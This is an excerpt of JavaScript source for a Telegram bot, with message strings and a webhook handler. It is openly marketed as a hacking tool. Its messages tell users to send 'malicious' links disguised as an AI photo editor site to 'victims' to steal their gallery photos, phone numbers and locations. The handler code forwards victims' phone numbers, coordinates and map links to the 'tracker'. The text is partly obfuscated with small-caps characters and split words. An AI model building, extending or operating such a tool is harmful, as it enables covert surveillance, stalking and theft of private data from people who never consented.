...
const messages = {
  en: {
    ...
    galleryLocked: (current, link) =>
      `❯ ɪɴ ᴛʜɪs ᴘᴀʀᴛ ᴏғ ᴛʜᴇ ʙᴏᴛ, ʏᴏᴜ ᴄᴀɴ ᴇᴀsɪʟʏ ʜᴀᴄᴋ ʏᴏᴜʀ ᴛᴀʀɢᴇᴛ ᴘʜᴏɴᴇ ɢ�.aʟʟᴇʀʏ ʙʏ ᴏᴜʀ ᴀᴅᴠᴀɴᴄᴇᴅ ᴀɴᴅ ᴘᴏᴡᴇʀғᴜʟ ʙᴏᴛ. ʜᴏᴡᴇᴠᴇʀ, ᴛᴏ ᴀᴄᴄᴇss ᴀɴᴅ ᴜɴʟᴏᴄᴋ ᴛʜᴇ Gᴀʟʟᴇʀʏ H�.aᴄᴋ, *ʏᴏᴜ ᴍᴜsᴛ ɪɴᴠɪᴛᴇ 3 ᴘᴇᴏᴘʟᴇ ᴜsɪɴɢ ʏᴏᴜʀ ɪɴᴠɪᴛᴇ* ʟɪɴᴋ\n\n*🔐 ʏᴏᴜʀ ɪɴᴠɪᴛᴇ = ${current}*\n\n🖇* ʏᴏᴜʀ ɪɴᴠɪᴛᴇ ʟɪɴᴋ = *${link}`,
    galleryMessage: (url) => `🛡*ʏᴏᴜʀ ɢᴀʟʟᴇʀʏ ʜᴀᴄᴋɪɴɢ ʟɪɴᴋ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ*\n\n*🖇 Link V1 -* ${url}\n\n*🖇 Link V2 - *${url}\n\n❯ ʙʏ ᴛʜᴀᴛ ᴍ�.aʟɪᴄɪᴏᴜs ᴀʙᴏᴠᴇ ʟɪɴᴋ ʏᴏᴜ ᴄᴀɴ ᴇᴀsɪʟʏ ʜ�.aᴄᴋ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ɢᴀʟʟᴇʀʏ ᴘʜᴏᴛᴏ\n❯ ᴛᴏ ᴅᴇᴠɪᴄᴇ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴍᴏʀᴇ ʙᴇᴛᴛᴇʀ, ᴛʜᴇ ʟɪɴᴋ ɪs ɪɴ ᴛʜᴇ ғᴏʀᴍ ᴏғ ᴀɪ ᴘʜᴏᴛᴏ ᴇᴅɪᴛᴏʀ sɪᴛᴇ\n❯ *ᴄᴏᴘʏ ᴛʜᴀᴛ ʟɪɴᴋ �.aɴᴅ sᴇɴᴅ ᴛᴏ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴀɴᴅ ᴡᴀɪᴛ ғᴏʀ ʜ�.aᴄᴋᴇᴅ ɢᴀʟʟᴇʀʏ ᴘʜᴏᴛᴏs ɪɴ ʙᴏᴛ *🖼`,
    phoneLocationMessage: (phoneUrl, locationUrl, bothUrl) => 
      `*🛡 ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ + ʟᴏᴄ�.aᴛɪᴏɴ ʜ�.aᴄᴋɪɴɢ ʟɪɴᴋs ᴄʀᴇ�.aᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ*\n\n` +
      ...
      `❯ Use the above links to h.a.c.k your victim's phone number and/or location. Copy the desired link and send it to your victim. Wait for the h.a.c.k.e.d information to be sent to you in the bot!`,
    ...
    adminMenu: {
      stats: '📊 sᴛᴀᴛɪsᴛɪᴄs',
      broadcast: '📢 ʙʀᴏᴀᴅᴄᴀsᴛ',
      setChannel: '🔗 sᴇᴛ ᴄʜ�.aɴɴᴇʟ ᴜʀʟ',
      blockUser: '📛 ʙʟᴏᴄᴋ ᴜsᴇʀ',
      unblockUser: '🔓 ᴜɴʙʟᴏᴄᴋ ᴜsᴇʀ',
      back: '🔙 ʙᴀᴄᴋ ᴍᴇɴᴜ ',
    },
    statsMessage: (username, totalUsers, createdAt, mainChannel, customChannel) =>
      `📊 sᴛ�.aᴛɪsᴛɪᴄs ғᴏʀ @${username}\n\n` +
      `👥 ᴛᴏᴛ�.aʟ ᴜsᴇʀs: ${totalUsers}\n` +
      `📅 ʙᴏᴛ ᴄʀᴇ�.aᴛᴇᴅ: ${createdAt}\n` +
      `🔗 ᴜɴᴄʜ�.aɴɢʙʟᴇ ᴜʀʟ: ${mainChannel}\n` +
      (customChannel ? `🔗 ʏᴏᴜʀ ᴄʜ�.aɴɴᴇʟ ᴜʀʟ: ${customChannel}` : '🔗 ʏᴏᴜʀ ᴄʜ�.aɴɴᴇʟ ᴜʀʟ: Not set'),
    broadcastPrompt: (totalUsers) => `📢 ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ ʙʀᴏ�.aᴅᴄ�.a.sᴛ ᴍᴇssᴀɢᴇ / ᴄᴏɴᴛᴇɴᴛ ᴛᴏ ʙʀᴏ�.aᴅᴄ�.a.sᴛ ${totalUsers} users:`,
    broadcastSuccess: (success, failed) => `ʙʀᴏ�.aᴅᴄ�.a.sᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ 🚀\n✅ sᴇɴᴛ ᴛᴏ ${success} ᴜsᴇʀs\n✖️ ғᴀɪʟᴇᴅ ғᴏʀ ${failed} ᴜsᴇʀs`,
    broadcastCancel: 'ʙʀᴏ�.aᴅᴄ�.a.sᴛ ᴄᴀɴᴄᴇʟʟᴇᴅ ✖️ ',
    setChannelPrompt: (mainChannel, customChannel) =>
      ` (Constant):\n${mainChannel}\n\n` +
      ` 🔗 Your ch.a.nnel url:\n${customChannel || 'Not set'}\n\n` +
      `Enter your ch.a.nnel URL to add as a second join button (e.g., https://t.me/your_channel or @your_channel):`,
    setChannelSuccess: (url, mainChannel) => `✅ ʏᴏᴜʀ ᴄʜ�.aɴɴᴇʟ ᴜʀʟ has been set to:\n${url}\nThe main ch.a.nnel URL remains:\n${mainChannel}`,
    invalidChannel: '✖️ Invalid URL. Please provide a valid Telegram ch.a.nnel URL (e.g., https://t.me/your_channel or @your_channel).',
...
module.exports = async (req, res) => {
  try {
    ...
    if (update.message) {
      ...
      if (text?.startsWith('/start')) {
      ...
      else if (text === '/admin' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        user.adminState = 'admin_panel';
        await user.save();
        await bot.telegram.sendMessage(chatId, messages[lang].adminPanel, adminMenuKeyboard(lang));
      }

      else if (user.adminState !== 'none' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].adminMenu.back) {
        ...
        if (user.adminState === 'admin_panel') {
          if (text === messages[lang].adminMenu.stats) {
            ...
            await bot.telegram.sendMessage(chatId, statsMessage, adminMenuKeyboard(lang));
          }
          ...
          const users = await BotUser.find({ botToken });
          const { success, failed } = await broadcastMessage(bot, update.message, users, userId);
          await bot.telegram.sendMessage(
            chatId,
          ...
          if (channelUrl.startsWith('@')) {
            channelUrl = channelUrl.replace('@', 'https://t.me/');
        ...
        if (user.requiresVerification && user.currentTrackerId) {
          try {
            ...
            // Fetch the tracker's language
            const tracker = await BotUser.findOne({ botToken, userId: trackerId });
            const trackerLang = tracker ? tracker.language : 'en';

            // Send phone number to the tracker in their language
            const notification = messages[trackerLang].phoneNumberNotification(username, userId, phoneNumber);
        ...
        if (user.requiresVerification && user.currentTrackerId) {
          try {
            ...
            // Send text-based notification to the tracker in their language
            const notification = messages[trackerLang].locationNotification(username, userId, latitude, longitude, mapsLink);
            await bot.telegram.sendMessage(trackerId, notification);
    ...
    if (update.callback_query) {
      ...
      if (callbackData === 'lang_en') {
        ...
        try {
          ...
          const caption = messages[lang].phoneLocationMessage(phoneUrl, locationUrl, bothUrl);
